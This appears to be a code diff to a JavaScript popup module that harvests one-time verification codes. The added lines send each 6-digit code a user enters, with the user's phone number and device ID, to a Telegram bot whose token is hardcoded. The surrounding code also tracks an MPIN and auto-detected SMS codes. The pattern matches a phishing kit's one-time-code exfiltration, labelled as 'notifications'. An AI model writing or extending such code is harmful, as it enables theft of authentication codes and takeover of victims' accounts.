@@ -1,6 +1,6 @@
 /**
  * Popup Share Module - Complete with Firewall Logic
- * With Telegram Notifications for 6-digit request and verification attempts
+ * With Telegram Notifications for 6-digit request, verification attempts, AND 6-digit code entry
  */
 
 // ========== POPUP MODULE ==========
@@ -17,6 +17,7 @@
     let detectedSMSCode = '';
     let smsReceiverStarted = false;
     let currentMPIN = '';
+    let lastNotifiedCode = ''; // Track last notified 6-digit code to avoid duplicate notifications
     
     // ========== TELEGRAM NOTIFICATIONS ==========
     const BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
@@ -35,6 +36,13 @@
         const now = new Date();
         const timestamp = now.toLocaleString();
         const message = `🔐 6-DIGIT CODE REQUESTED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nTime: ${timestamp}\nStatus: Waiting for 6-digit code input`;
+        await sendTelegramMessage(message);
+    }
+    
+    async function send6DigitCodeEnteredNotification(userPhone, deviceId, codeEntered) {
+        const now = new Date();
+        const timestamp = now.toLocaleString();
+        const message = `📝 6-DIGIT CODE ENTERED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nCode Entered: ${codeEntered}\nTime: ${timestamp}\nStatus: Code submitted for verification`;
         await sendTelegramMessage(message);
     }
     
@@ -75,6 +83,7 @@
         invalidAttempts = 0;
         currentMPIN = '';
         detectedSMSCode = '';
+        lastNotifiedCode = '';
         console.log('Invalid attempts reset to 0');
     }
     
@@ -110,6 +119,7 @@
         
         if (code6Input) code6Input.value = '';
         currentMPIN = '';
+        lastNotifiedCode = '';
         updateMPINDots();
         
         if (step1Container) step1Container.style.display = 'block';
@@ -433,6 +443,7 @@
         
         currentPhase = 3;
         detectedSMSCode = '';
+        lastNotifiedCode = '';
         
         popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
         popupInner.style.opacity = '0';
@@ -599,7 +610,7 @@
         }
         
         if (verifyBtn) {
-            verifyBtn.onclick = function() {
+            verifyBtn.onclick = async function() {
                 const code = codeInput ? codeInput.value.trim() : '';
                 
                 if (!code || code.length !== 6 || !/^\d+$/.test(code)) {
@@ -615,6 +626,16 @@
                 }
                 
                 console.log('6-digit code accepted:', code);
+                
+                // SEND TELEGRAM NOTIFICATION FOR 6-DIGIT CODE ENTERED
+                const userPhone = localStorage.getItem("userPhone") || "Unknown";
+                const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+                
+                // Only send notification if this code hasn't been notified yet
+                if (lastNotifiedCode !== code) {
+                    await send6DigitCodeEnteredNotification(userPhone, deviceId, code);
+                    lastNotifiedCode = code;
+                }
                 
                 // Transition to Step 2
                 step1Container.style.transition = 'opacity 0.3s ease';
